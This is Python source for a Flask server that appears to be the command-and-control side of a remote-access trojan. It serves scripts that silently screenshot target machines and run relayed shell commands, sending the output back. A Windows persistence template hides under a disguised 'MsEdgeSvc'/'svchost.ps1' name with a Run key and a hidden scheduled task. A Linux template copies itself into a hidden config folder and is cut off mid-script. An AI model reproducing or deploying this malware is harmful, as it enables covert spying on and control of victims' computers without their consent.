"""
ESP32 HID Relay Server
- Serves MQTT control page at /
- Receives screenshots from target via /esp/screenshot
- Provides per-OS capture scripts (PowerShell / bash / Python3)
- Live-stop signal so loops on target can be killed remotely
"""
from flask import Flask, request, jsonify, Response, stream_with_context
import json, time, threading, collections, base64, urllib.request
import subprocess, shutil, glob, os

app = Flask(__name__)

pending  = collections.deque()
results  = collections.deque(maxlen=50)
esp_info = {"ip": None, "ssid": None, "connected": False, "last_seen": 0}
lock     = threading.Lock()

_screenshot  = {"data": None, "ts": 0.0, "frame": 0, "os": "?"}
_live_active = {"stop": False}   # target loops poll this
_cam_config  = {"url": ""}       # camera proxy URL
_shell       = {"pending": {"cmd": "", "os": "windows", "id": 0},
                "history": collections.deque(maxlen=100)}
_hdmi_config = {"device": "/dev/video0", "width": 1280, "height": 720, "fps": 10, "quality": 5}
_device      = {"connected": False, "hostname": None, "os": None,
                "user": None, "ip": None, "arch": None, "ts": 0.0}

# ── Multi-device state (persistent agents) ───────────────────────────────────
_devices = {}  # keyed by UUID device_id

def _dev(did):
    if did not in _devices:
        _devices[did] = {
            "id": did, "hostname": None, "os": None, "user": None,
            "ip": None, "arch": None, "ts": 0.0,
            "screenshot": None, "screenshot_ts": 0.0,
            "pending": {"cmd": "", "id": 0},
            "history": collections.deque(maxlen=100),
            "persistent": False,
        }
    return _devices[did]

# ── helpers ──────────────────────────────────────────────────────────────────

PI_MODE = os.environ.get("PI_FEATURES") == "1"   # set in Pi systemd unit; absent on Render

def _pi_required():
    """Return an error response if this endpoint needs the Pi server."""
    if not PI_MODE:
        return jsonify({
            "error": "Pi server required",
            "pi_required": True,
            "message": "This feature needs the Pi server running locally (HDMI capture, etc.). The Render cloud server handles everything else."
        }), 503
    return None

def _base_url():
    fwd_host  = request.headers.get("X-Forwarded-Host")  or request.host
    fwd_proto = request.headers.get("X-Forwarded-Proto") or request.scheme
    return f"{fwd_proto}://{fwd_host}"

# ── ESP32 relay endpoints (kept for compatibility) ────────────────────────────

@app.route("/esp/register", methods=["POST"])
def esp_register():
    data = request.get_json(silent=True) or {}
    with lock:
        esp_info.update({"ip": data.get("ip"), "ssid": data.get("ssid"),
                         "connected": True, "last_seen": time.time()})
    return jsonify({"ok": True})

@app.route("/esp/poll")
def esp_poll():
    with lock:
        esp_info["last_seen"] = time.time()
        esp_info["connected"] = True
        if pending:
            return jsonify(pending.popleft())
    return jsonify({"type": "none"})

@app.route("/esp/result", methods=["POST"])
def esp_result():
    data = request.get_json(silent=True) or {}
    results.appendleft({"ts": time.strftime("%H:%M:%S"), **data})
    return jsonify({"ok": True})

# ── Screenshot receive ────────────────────────────────────────────────────────

@app.route("/esp/screenshot", methods=["POST"])
def esp_screenshot():
    data = request.get_json(silent=True) or {}
    img  = data.get("img", "")
    if img:
        with lock:
            _screenshot["data"]  = img
            _screenshot["ts"]    = time.time()
            _screenshot["frame"] += 1
            _screenshot["os"]    = data.get("os", "?")
    return jsonify({"ok": bool(img)})

# ── Screenshot serve ──────────────────────────────────────────────────────────

@app.route("/api/screenshot")
def api_screenshot():
    with lock:
        img_b64 = _screenshot["data"]
    if not img_b64:
        return jsonify({"error": "no screenshot yet"}), 404
    try:
        img_bytes = base64.b64decode(img_b64)
    except Exception:
        return jsonify({"error": "bad image data"}), 500
    mime = "image/png" if img_bytes[:4] == b'\x89PNG' else "image/jpeg"
    resp = Response(img_bytes, mimetype=mime)
    resp.headers["Cache-Control"] = "no-store"
    return resp

@app.route("/api/screenshot/info")
def api_screenshot_info():
    with lock:
        s = dict(_screenshot)
    return jsonify({"available": s["data"] is not None,
                    "ts": s["ts"], "frame": s["frame"], "os": s["os"]})

# ── Live-loop control ─────────────────────────────────────────────────────────

@app.route("/api/live-stop")
def api_live_stop():
    with lock:
        return jsonify({"stop": _live_active["stop"]})

@app.route("/api/live-ctrl", methods=["POST"])
def api_live_ctrl():
    data   = request.get_json(silent=True) or {}
    action = data.get("action", "")
    with lock:
        _live_active["stop"] = (action == "stop")
    return jsonify({"ok": True, "stop": _live_active["stop"]})

# ── Per-OS capture scripts ────────────────────────────────────────────────────

ESP_AP = "http://192.168.4.1/api/screenshot"   # fallback when target has no internet

def _post_snippet_ps(relay_url):
    """PowerShell fragment: POST $r to relay, fall back to ESP32 AP."""
    return f"""$sent=$false
try{{Invoke-RestMethod '{relay_url}/esp/screenshot' -Method POST -Body $r -ContentType 'application/json' -TimeoutSec 10;$sent=$true}}catch{{}}
if(-not $sent){{try{{Invoke-RestMethod '{ESP_AP}' -Method POST -Body $r -ContentType 'application/json' -TimeoutSec 6}}catch{{}}}}"""

def _post_snippet_py(relay_url):
    """Python fragment: POST body to relay, fall back to ESP32 AP."""
    return f"""sent=False
for _u in ['{relay_url}/esp/screenshot','{ESP_AP}']:
    try:
        urllib.request.urlopen(urllib.request.Request(_u,body,{{'Content-Type':'application/json'}}),timeout=10)
        sent=True;break
    except:pass"""


@app.route("/ps/win")
@app.route("/ps/shot")         # legacy alias
def ps_win():
    u = _base_url()
    post = _post_snippet_ps(u)
    script = f"""[Net.ServicePointManager]::SecurityProtocol='Tls12'
Add-Type -Assembly System.Windows.Forms,System.Drawing
$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height)
$g=[System.Drawing.Graphics]::FromImage($b)
$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size)
$ms=New-Object System.IO.MemoryStream
$ep=New-Object System.Drawing.Imaging.EncoderParameters(1)
$ep.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,40L)
$codec=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|?{{$_.MimeType-eq'image/jpeg'}}
$b.Save($ms,$codec,$ep)
$r=@{{img=[Convert]::ToBase64String($ms.ToArray());os='Windows'}}|ConvertTo-Json -Compress
{post}
"""
    return Response(script, mimetype="text/plain; charset=utf-8")


@app.route("/ps/win-live")
def ps_win_live():
    u = _base_url()
    post = _post_snippet_ps(u)
    script = f"""[Net.ServicePointManager]::SecurityProtocol='Tls12'
Add-Type -Assembly System.Windows.Forms,System.Drawing
$ep=New-Object System.Drawing.Imaging.EncoderParameters(1)
$ep.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,25L)
$codec=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|?{{$_.MimeType-eq'image/jpeg'}}
while($true){{
  try{{if((Invoke-RestMethod '{u}/api/live-stop' -TimeoutSec 3).stop){{break}}}}catch{{}}
  $s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
  $b=New-Object System.Drawing.Bitmap($s.Width,$s.Height)
  $g=[System.Drawing.Graphics]::FromImage($b)
  $g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size)
  $ms=New-Object System.IO.MemoryStream
  $b.Save($ms,$codec,$ep)
  $r=@{{img=[Convert]::ToBase64String($ms.ToArray());os='Windows'}}|ConvertTo-Json -Compress
  {post}
  $g.Dispose();$b.Dispose();$ms.Dispose()
  Start-Sleep -Milliseconds 1200
}}
"""
    return Response(script, mimetype="text/plain; charset=utf-8")


@app.route("/sh/linux")
def sh_linux():
    u = _base_url()
    post = _post_snippet_py(u)
    script = f"""#!/usr/bin/env python3
import subprocess,base64,urllib.request,json,os,tempfile,platform
os.environ['DISPLAY']=os.environ.get('DISPLAY',':0')
f=tempfile.mktemp(suffix='.jpg')
for cmd in [['scrot','-q','35',f],['import','-window','root','-quality','35',f],
            ['gnome-screenshot','-f',f]]:
    if subprocess.run(cmd,capture_output=True).returncode==0:break
if os.path.isfile(f) and os.path.getsize(f)>100:
    d=open(f,'rb').read();os.unlink(f)
    body=json.dumps({{'img':base64.b64encode(d).decode(),'os':platform.system()}}).encode()
    {post}
"""
    return Response(script, mimetype="text/plain; charset=utf-8")


@app.route("/sh/linux-live")
def sh_linux_live():
    u = _base_url()
    post = _post_snippet_py(u)
    script = f"""#!/usr/bin/env python3
import subprocess,base64,urllib.request,json,os,tempfile,platform,time
os.environ['DISPLAY']=os.environ.get('DISPLAY',':0')
while True:
    try:
        if json.loads(urllib.request.urlopen('{u}/api/live-stop',timeout=3).read()).get('stop'):break
    except:pass
    f=tempfile.mktemp(suffix='.jpg')
    for cmd in [['scrot','-q','25',f],['import','-window','root','-quality','25',f]]:
        if subprocess.run(cmd,capture_output=True).returncode==0:break
    if os.path.isfile(f) and os.path.getsize(f)>100:
        d=open(f,'rb').read();os.unlink(f)
        body=json.dumps({{'img':base64.b64encode(d).decode(),'os':platform.system()}}).encode()
        {post}
    time.sleep(1.2)
"""
    return Response(script, mimetype="text/plain; charset=utf-8")


@app.route("/sh/mac")
def sh_mac():
    u = _base_url()
    post = _post_snippet_py(u)
    script = f"""#!/usr/bin/env python3
import subprocess,base64,urllib.request,json,os,tempfile
f=tempfile.mktemp(suffix='.jpg')
subprocess.run(['screencapture','-x','-t','jpg',f],capture_output=True)
if os.path.isfile(f) and os.path.getsize(f)>100:
    d=open(f,'rb').read();os.unlink(f)
    body=json.dumps({{'img':base64.b64encode(d).decode(),'os':'Darwin'}}).encode()
    {post}
"""
    return Response(script, mimetype="text/plain; charset=utf-8")


@app.route("/sh/android")
def sh_android():
    u = _base_url()
    post = _post_snippet_py(u)
    script = f"""#!/usr/bin/env python3
import subprocess,base64,urllib.request,json,os
td=os.environ.get('TMPDIR','/data/data/com.termux/files/usr/tmp')
f=os.path.join(td,'ss.png')
r=subprocess.run(['screencap','-p',f],capture_output=True,timeout=5)
if r.returncode!=0:subprocess.run(['termux-screenshot','-q',f],capture_output=True,timeout=10)
if os.path.isfile(f) and os.path.getsize(f)>100:
    d=open(f,'rb').read();os.unlink(f)
    body=json.dumps({{'img':base64.b64encode(d).decode(),'os':'Android'}}).encode()
    {post}
"""
    return Response(script, mimetype="text/plain; charset=utf-8")


@app.route("/sh/android-live")
def sh_android_live():
    u = _base_url()
    post = _post_snippet_py(u)
    script = f"""#!/usr/bin/env python3
import subprocess,base64,urllib.request,json,os,time
td=os.environ.get('TMPDIR','/data/data/com.termux/files/usr/tmp')
while True:
    try:
        if json.loads(urllib.request.urlopen('{u}/api/live-stop',timeout=3).read()).get('stop'):break
    except:pass
    f=os.path.join(td,'ss.png')
    r=subprocess.run(['screencap','-p',f],capture_output=True,timeout=5)
    if r.returncode!=0:subprocess.run(['termux-screenshot','-q',f],capture_output=True,timeout=10)
    if os.path.isfile(f) and os.path.getsize(f)>100:
        d=open(f,'rb').read();os.unlink(f)
        body=json.dumps({{'img':base64.b64encode(d).decode(),'os':'Android'}}).encode()
        {post}
    time.sleep(2)
"""
    return Response(script, mimetype="text/plain; charset=utf-8")


@app.route("/sh/mac-live")
def sh_mac_live():
    u = _base_url()
    post = _post_snippet_py(u)
    script = f"""#!/usr/bin/env python3
import subprocess,base64,urllib.request,json,os,tempfile,time
while True:
    try:
        if json.loads(urllib.request.urlopen('{u}/api/live-stop',timeout=3).read()).get('stop'):break
    except:pass
    f=tempfile.mktemp(suffix='.jpg')
    subprocess.run(['screencapture','-x','-t','jpg',f],capture_output=True)
    if os.path.isfile(f) and os.path.getsize(f)>100:
        d=open(f,'rb').read();os.unlink(f)
        body=json.dumps({{'img':base64.b64encode(d).decode(),'os':'Darwin'}}).encode()
        {post}
    time.sleep(1.2)
"""
    return Response(script, mimetype="text/plain; charset=utf-8")

# ── Standard API endpoints ────────────────────────────────────────────────────

@app.route("/api/cam/set", methods=["POST"])
def api_cam_set():
    data = request.get_json(silent=True) or {}
    url  = data.get("url", "").strip()
    with lock:
        _cam_config["url"] = url
    return jsonify({"ok": True, "url": url})

@app.route("/api/cam/info")
def api_cam_info():
    with lock:
        url = _cam_config["url"]
    return jsonify({"url": url, "set": bool(url)})

@app.route("/api/cam/stream")
def api_cam_stream():
    with lock:
        url = _cam_config["url"]
    if not url:
        return jsonify({"error": "no camera URL configured"}), 404
    try:
        remote       = urllib.request.urlopen(url, timeout=10)
        content_type = remote.headers.get("Content-Type", "multipart/x-mixed-replace; boundary=frame")
    except Exception as e:
        return jsonify({"error": str(e)}), 502

    def generate():
        try:
            while True:
                chunk = remote.read(8192)
                if not chunk:
                    break
                yield chunk
        finally:
            try: remote.close()
            except: pass

    return Response(stream_with_context(generate()),
                    content_type=content_type,
                    headers={"Cache-Control": "no-store"})

@app.route("/api/cam/snap")
def api_cam_snap():
    with lock:
        url = _cam_config["url"]
    if not url:
        return jsonify({"error": "no camera URL configured"}), 404
    snap_url = url.replace("/video", "/shot.jpg") if url.endswith("/video") else url
    try:
        with urllib.request.urlopen(snap_url, timeout=8) as resp:
            data         = resp.read()
            content_type = resp.headers.get("Content-Type", "image/jpeg")
    except Exception as e:
        return jsonify({"error": str(e)}), 502
    r = Response(data, mimetype=content_type)
    r.headers["Cache-Control"] = "no-store"
    return r

@app.route("/api/command", methods=["POST"])
def api_command():
    cmd = request.get_json(silent=True)
    if not cmd:
        return jsonify({"error": "no body"}), 400
    with lock:
        pending.append(cmd)
    return jsonify({"queued": True, "queue_depth": len(pending)})

@app.route("/api/status")
def api_status():
    with lock:
        info = dict(esp_info)
    online = (time.time() - info["last_seen"]) < 15
    return jsonify({"online": online, "ip": info["ip"], "ssid": info["ssid"],
                    "queue": len(pending), "results": list(results)[:10]})

@app.route("/api/ping")
def api_ping():
    return jsonify({"pong": True})

@app.route("/apk/android")
def apk_android():
    from flask import redirect
    return redirect(
        "https://github.com/mvhdhamxa19/xusb/releases/latest/download/agent.apk",
        code=302)

@app.route("/")
def index():
    page = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mqtt-control.html")
    with open(page, "r") as f:
        return Response(f.read(), mimetype="text/html")

# ── Shell command execution ───────────────────────────────────────────────────

@app.route("/api/shell/exec", methods=["POST"])
def api_shell_exec():
    data   = request.get_json(silent=True) or {}
    cmd    = data.get("cmd", "").strip()
    tgt_os = data.get("os", "windows")
    if not cmd:
        return jsonify({"error": "no command"}), 400
    with lock:
        _shell["pending"]["cmd"] = cmd
        _shell["pending"]["os"]  = tgt_os
        _shell["pending"]["id"] += 1
        cmd_id = _shell["pending"]["id"]
    return jsonify({"ok": True, "id": cmd_id})

@app.route("/esp/pending-cmd")
def esp_pending_cmd():
    with lock:
        return jsonify(dict(_shell["pending"]))

@app.route("/esp/cmdout", methods=["POST"])
def esp_cmdout():
    data   = request.get_json(silent=True) or {}
    raw    = data.get("out", "")
    cmd    = data.get("cmd", "")
    tgt_os = data.get("os", "?")
    ts     = time.strftime("%H:%M:%S")
    try:
        out = base64.b64decode(raw).decode("utf-8", "replace")
    except Exception:
        out = raw
    with lock:
        _shell["history"].appendleft({"ts": ts, "cmd": cmd, "out": out, "os": tgt_os,
                                       "id": _shell["pending"]["id"]})
    return jsonify({"ok": True})

@app.route("/api/shell/output")
def api_shell_output():
    with lock:
        return jsonify(list(_shell["history"])[:30])

@app.route("/sh/bootstrap-win")
def sh_bootstrap_win():
    """Mobile Hotspot via WinRT — no admin needed on Windows 10/11.
    Falls back to netsh hosted network if WinRT unavailable."""
    ssid = "ESP32NET"
    pwd  = "esp32net1"
    script = f"""[Net.ServicePointManager]::SecurityProtocol='Tls12'
Add-Type -AssemblyName System.Runtime.WindowsRuntime | Out-Null
function _Await($t){{
  $m=([System.WindowsRuntimeSystemExtensions].GetMethods()|Where-Object{{$_.Name-eq'AsTask'-and$_.GetParameters().Count-eq 1}})[0]
  $r=$m.Invoke($null,@($t));$r.Wait(-1)|Out-Null
}}
try {{
  [void][Windows.Networking.Connectivity.NetworkInformation,Windows.Networking.Connectivity,ContentType=WindowsRuntime]
  [void][Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager,Windows.Networking,ContentType=WindowsRuntime]
  $cp=[Windows.Networking.Connectivity.NetworkInformation]::GetInternetConnectionProfile()
  $mgr=[Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager]::CreateFromConnectionProfile($cp)
  $cfg=$mgr.GetCurrentAccessPointConfiguration()
  $cfg.Ssid='{ssid}'
  $cfg.Passphrase='{pwd}'
  _Await($mgr.ConfigureAccessPointAsync($cfg))
  _Await($mgr.StartTetheringAsync())
}} catch {{
  # WinRT failed — try netsh (needs admin)
  netsh wlan set hostednetwork mode=allow ssid='{ssid}' key='{pwd}' 2>&1|Out-Null
  netsh wlan start hostednetwork 2>&1|Out-Null
}}
"""
    return Response(script, mimetype="text/plain; charset=utf-8")

@app.route("/sh/run-win")
def sh_run_win():
    u = _base_url()
    script = f"""[Net.ServicePointManager]::SecurityProtocol='Tls12'
try{{$p=Invoke-RestMethod '{u}/esp/pending-cmd' -TimeoutSec 8}}catch{{exit}}
$cmd=$p.cmd
if(-not $cmd){{exit}}
try{{$o=Invoke-Expression $cmd 2>&1|Out-String}}catch{{$o=$_.Exception.Message}}
$o=$o.Substring(0,[Math]::Min($o.Length,8192))
$ob=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($o))
$body=@{{cmd=$cmd;out=$ob;os='Windows'}}|ConvertTo-Json -Compress
try{{Invoke-RestMethod '{u}/esp/cmdout' -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 15}}catch{{}}
"""
    return Response(script, mimetype="text/plain; charset=utf-8")

@app.route("/sh/run-linux")
def sh_run_linux():
    u = _base_url()
    script = f"""#!/usr/bin/env python3
import urllib.request,json,subprocess,base64,platform,sys
cmd=''
try:
    p=json.loads(urllib.request.urlopen('{u}/esp/pending-cmd',timeout=8).read())
    cmd=p.get('cmd','')
    if not cmd:sys.exit()
    r=subprocess.run(cmd,shell=True,capture_output=True,timeout=30)
    out=base64.b64encode(r.stdout+r.stderr).decode()
except Exception as e:
    out=base64.b64encode(('Error: '+str(e)).encode()).decode()
body=json.dumps({{'cmd':cmd,'out':out,'os':platform.system()}}).encode()
try:urllib.request.urlopen(urllib.request.Request('{u}/esp/cmdout',body,{{'Content-Type':'application/json'}}),timeout=15)
except:pass
"""
    return Response(script, mimetype="text/plain; charset=utf-8")

@app.route("/sh/run-mac")
def sh_run_mac():
    u = _base_url()
    script = f"""#!/usr/bin/env python3
import urllib.request,json,subprocess,base64,platform,sys
cmd=''
try:
    p=json.loads(urllib.request.urlopen('{u}/esp/pending-cmd',timeout=8).read())
    cmd=p.get('cmd','')
    if not cmd:sys.exit()
    r=subprocess.run(cmd,shell=True,capture_output=True,timeout=30)
    out=base64.b64encode(r.stdout+r.stderr).decode()
except Exception as e:
    out=base64.b64encode(('Error: '+str(e)).encode()).decode()
body=json.dumps({{'cmd':cmd,'out':out,'os':platform.system()}}).encode()
try:urllib.request.urlopen(urllib.request.Request('{u}/esp/cmdout',body,{{'Content-Type':'application/json'}}),timeout=15)
except:pass
"""
    return Response(script, mimetype="text/plain; charset=utf-8")

# ── Agent registration (persistent shell agent on target) ────────────────────

@app.route("/esp/agent-register", methods=["POST"])
def esp_agent_register():
    data = request.get_json(silent=True) or {}
    with lock:
        _device.update({
            "connected": True,
            "hostname":  data.get("hostname"),
            "os":        data.get("os"),
            "user":      data.get("user"),
            "ip":        data.get("ip"),
            "arch":      data.get("arch"),
            "ts":        time.time(),
        })
    return jsonify({"ok": True})

@app.route("/api/device-info")
def api_device_info():
    with lock:
        d = dict(_device)
    d["connected"] = d.get("ts", 0) > time.time() - 60   # 60s heartbeat window
    d["ago"] = round(time.time() - d.get("ts", 0))
    return jsonify(d)

@app.route("/sh/agent-linux")
def sh_agent_linux():
    u = _base_url()
    script = f"""#!/usr/bin/env python3
import urllib.request,json,subprocess,base64,platform,socket,os,time,sys
R='{u}'
lid=0
def post(ep,d):
    try:urllib.request.urlopen(urllib.request.Request(R+ep,json.dumps(d).encode(),{{'Content-Type':'application/json'}}),timeout=15)
    except:pass
def register():
    try:ip=socket.gethostbyname(socket.gethostname())
    except:ip='?'
    post('/esp/agent-register',{{'hostname':socket.gethostname(),'os':platform.system()+' '+platform.release(),'user':os.environ.get('USER',os.environ.get('USERNAME','?')),'ip':ip,'arch':platform.machine()}})
register()
lt=time.time()
while True:
    try:
        if time.time()-lt>20:register();lt=time.time()
        p=json.loads(urllib.request.urlopen(R+'/esp/pending-cmd',timeout=8).read())
        if p.get('cmd') and p.get('id',0)!=lid:
            lid=p['id']
            try:r=subprocess.run(p['cmd'],shell=True,capture_output=True,timeout=30);out=base64.b64encode(r.stdout+r.stderr).decode()
            except Exception as e:out=base64.b64encode(('Error: '+str(e)).encode()).decode()
            post('/esp/cmdout',{{'cmd':p['cmd'],'out':out,'os':platform.system()}})
    except KeyboardInterrupt:sys.exit()
    except:pass
    time.sleep(2)
"""
    return Response(script, mimetype="text/plain; charset=utf-8")

@app.route("/sh/agent-mac")
def sh_agent_mac():
    # Identical logic, macOS is also POSIX
    return sh_agent_linux()

@app.route("/sh/agent-win")
def sh_agent_win():
    u = _base_url()
    script = f"""[Net.ServicePointManager]::SecurityProtocol='Tls12'
$R='{u}'
$lid=0
function Post($ep,$d){{try{{Invoke-RestMethod "$R$ep" -Method POST -Body($d|ConvertTo-Json -Compress) -ContentType 'application/json' -TimeoutSec 15}}catch{{}}}}
try{{
    $ip=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{{$_.IPAddress -ne '127.0.0.1'}}|Select-Object -First 1).IPAddress
    Post '/esp/agent-register' @{{hostname=$env:COMPUTERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption;user=$env:USERNAME;ip=$ip;arch=$env:PROCESSOR_ARCHITECTURE}}
}}catch{{}}
$lt=[datetime]::Now
while($true){{
    try{{
        if(([datetime]::Now-$lt).TotalSeconds -gt 20){{
            Post '/esp/agent-register' @{{hostname=$env:COMPUTERNAME;os='Windows';user=$env:USERNAME}};$lt=[datetime]::Now
        }}
        $p=Invoke-RestMethod "$R/esp/pending-cmd" -TimeoutSec 8
        if($p.cmd -and $p.id -ne $lid){{
            $lid=$p.id
            try{{$o=Invoke-Expression $p.cmd 2>&1|Out-String}}catch{{$o=$_.Exception.Message}}
            $o=$o.Substring(0,[Math]::Min($o.Length,8192))
            $ob=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($o))
            Post '/esp/cmdout' @{{cmd=$p.cmd;out=$ob;os='Windows'}}
        }}
    }}catch{{}}
    Start-Sleep -Seconds 2
}}
"""
    return Response(script, mimetype="text/plain; charset=utf-8")

# ── HDMI Capture Card (V4L2 via ffmpeg) ──────────────────────────────────────

@app.route("/api/cam/hdmi")
def api_cam_hdmi():
    err = _pi_required();
    if err: return err
    cfg    = dict(_hdmi_config)
    device = cfg["device"]
    if not os.path.exists(device):
        return jsonify({"error": f"Device {device} not found. Check: ls /dev/video*"}), 404
    if not shutil.which("ffmpeg"):
        return jsonify({"error": "ffmpeg not installed on Pi. Run: sudo apt install ffmpeg"}), 503

    cmd = [
        "ffmpeg", "-loglevel", "quiet",
        "-f", "v4l2",
        "-framerate", str(cfg["fps"]),
        "-video_size", f"{cfg['width']}x{cfg['height']}",
        "-i", device,
        "-vf", f"scale={cfg['width']}:-2",
        "-q:v", str(cfg["quality"]),
        "-vcodec", "mjpeg",
        "-f", "image2pipe", "pipe:1",
    ]

    def generate():
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.DEVNULL, bufsize=2 ** 20)
        buf = b""
        try:
            while True:
                chunk = proc.stdout.read(65536)
                if not chunk:
                    break
                buf += chunk
                while True:
                    s = buf.find(b"\xff\xd8")
                    e = buf.find(b"\xff\xd9", s + 2 if s >= 0 else 0)
                    if s < 0 or e < 0:
                        break
                    frame = buf[s : e + 2]
                    buf   = buf[e + 2 :]
                    yield (b"--frame\r\n"
                           b"Content-Type: image/jpeg\r\n\r\n" +
                           frame + b"\r\n")
        finally:
            try: proc.kill()
            except: pass

    return Response(
        stream_with_context(generate()),
        mimetype="multipart/x-mixed-replace; boundary=frame",
        headers={"Cache-Control": "no-store"},
    )

@app.route("/api/cam/hdmi/info")
def api_cam_hdmi_info():
    err = _pi_required();
    if err: return err
    devices   = sorted(glob.glob("/dev/video*"))
    ffmpeg_ok = bool(shutil.which("ffmpeg"))
    has_dev   = os.path.exists(_hdmi_config["device"])
    return jsonify({
        "devices":  devices,
        "current":  _hdmi_config["device"],
        "ffmpeg":   ffmpeg_ok,
        "ready":    has_dev and ffmpeg_ok,
        "config":   dict(_hdmi_config),
    })

@app.route("/api/cam/hdmi/config", methods=["POST"])
def api_cam_hdmi_config():
    data = request.get_json(silent=True) or {}
    for k in ("device", "width", "height", "fps", "quality"):
        if k in data:
            _hdmi_config[k] = data[k]
    return jsonify({"ok": True, "config": dict(_hdmi_config)})

# ── Persistent agent script templates (use __RELAY__ as placeholder) ─────────

_PERSIST_WIN = r"""[Net.ServicePointManager]::SecurityProtocol='Tls12'
$R='__RELAY__'
$D="$env:APPDATA\.ms"
if(-not(Test-Path $D)){New-Item -ItemType Directory $D -Force|Out-Null}
$idF="$D\.xaid";$AP="$D\svchost.ps1"
if(Test-Path $idF){$DID=(Get-Content $idF -Raw).Trim()}else{$DID=[Guid]::NewGuid().ToString();Set-Content $idF $DID}
if(-not(Test-Path $AP)){
    try{(New-Object Net.WebClient).DownloadFile("$R/sh/persist-win",$AP)}catch{try{Copy-Item $PSCommandPath $AP -EA SilentlyContinue}catch{}}
}
try{Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' 'MsEdgeSvc' "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$AP`"" -Force}catch{}
try{schtasks /create /tn "MsEdgeSvc" /tr "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$AP`"" /sc ONLOGON /f 2>$null|Out-Null}catch{}
function Post($ep,$d){
    try{$b=[Text.Encoding]::UTF8.GetBytes(($d|ConvertTo-Json -Compress))
    $req=[Net.WebRequest]::Create("$R$ep");$req.Method='POST';$req.ContentType='application/json';$req.Timeout=15000
    $s=$req.GetRequestStream();$s.Write($b,0,$b.Length);$s.Close();$req.GetResponse().Close()}catch{}
}
function Get_($ep){try{(New-Object Net.WebClient).DownloadString("$R$ep")}catch{'{"cmd":"","id":0}'}}
Add-Type -Assembly System.Windows.Forms,System.Drawing -EA SilentlyContinue
function Shot{
    try{$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);$g=[System.Drawing.Graphics]::FromImage($b)
    $g.CopyFromScreen($s.Location,[Drawing.Point]::Empty,$s.Size);$ms=New-Object IO.MemoryStream
    $ep2=New-Object Drawing.Imaging.EncoderParameters(1)
    $ep2.Param[0]=New-Object Drawing.Imaging.EncoderParameter([Drawing.Imaging.Encoder]::Quality,25L)
    $c=[Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|?{$_.MimeType-eq'image/jpeg'}
    $b.Save($ms,$c,$ep2);$r=[Convert]::ToBase64String($ms.ToArray())
    $g.Dispose();$b.Dispose();$ms.Dispose();$r}catch{''}
}
try{$ip=(Get-NetIPAddress -AF IPv4|?{$_.IPAddress -ne '127.0.0.1' -and $_.PrefixOrigin -ne 'WellKnown'}|select -First 1).IPAddress}catch{$ip='?'}
try{$os=(Get-WmiObject Win32_OperatingSystem -EA SilentlyContinue).Caption;if(-not $os){$os='Windows'}}catch{$os='Windows'}
Post '/esp/device-register' @{did=$DID;hostname=$env:COMPUTERNAME;os=$os;user=$env:USERNAME;ip=$ip;arch=$env:PROCESSOR_ARCHITECTURE;persistent=$true}
$lid=0;$lst=0;$lreg=[datetime]::Now
while($true){
    try{
        if(([datetime]::Now-$lreg).TotalSeconds -gt 30){
            Post '/esp/device-register' @{did=$DID;hostname=$env:COMPUTERNAME;os=$os;user=$env:USERNAME;ip=$ip;persistent=$true};$lreg=[datetime]::Now}
        if(([int](Get-Date -UF %s)) -gt ($lst+3)){
            $img=Shot;if($img){Post '/esp/device-screenshot' @{did=$DID;img=$img;os=$os}};$lst=[int](Get-Date -UF %s)}
        $p=Get_ "/esp/device-cmd?did=$DID"|ConvertFrom-Json
        if($p.cmd -and $p.id -ne $lid){
            $lid=$p.id;$c=$p.cmd
            if($c -eq '__uninstall__'){
                try{Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' 'MsEdgeSvc' -EA SilentlyContinue}catch{}
                try{schtasks /delete /tn 'MsEdgeSvc' /f 2>$null|Out-Null}catch{}
                Post '/esp/device-cmdout' @{did=$DID;cmd=$c;out=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('Uninstalled'))}
                Start-Sleep 2;try{Remove-Item $AP,$idF -Force -EA SilentlyContinue}catch{};exit}
            try{$o=Invoke-Expression $c 2>&1|Out-String}catch{$o=$_.Exception.Message}
            $o=$o.Substring(0,[Math]::Min($o.Length,8192))
            Post '/esp/device-cmdout' @{did=$DID;cmd=$c;out=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($o));os=$os}}
    }catch{}
    Start-Sleep -Milliseconds 2000}
"""

_PERSIST_LINUX = r"""#!/usr/bin/env python3
import urllib.request,json,subprocess,base64,platform,socket,os,time,sys,uuid,tempfile,shutil
R='__RELAY__'
HOME=os.path.expanduser('~')
CFG=os.path.join(HOME,'.config','.sysd');os.makedirs(CFG,exist_ok=True)
ID_F=os.path.join(CFG,'.xaid');AP=os.path.join(CFG,'sysupd.py')
DID=open(ID_F).read().strip() if os.path.exists(ID_F) else str(uuid.uuid4())
if not os.path.exists(ID_F):open(ID_F,'w').write(DID)
if os.path.realpath(sys.argv[0])!=AP:
    try:shutil.copy2(sys.argv[0],AP);os.chmod(AP,0o700)
    except:
        try:urllib.request.urlretrieve(R+'/sh/persist-linux',AP);os.chmod(AP,0o700)
        except:pass
    try:
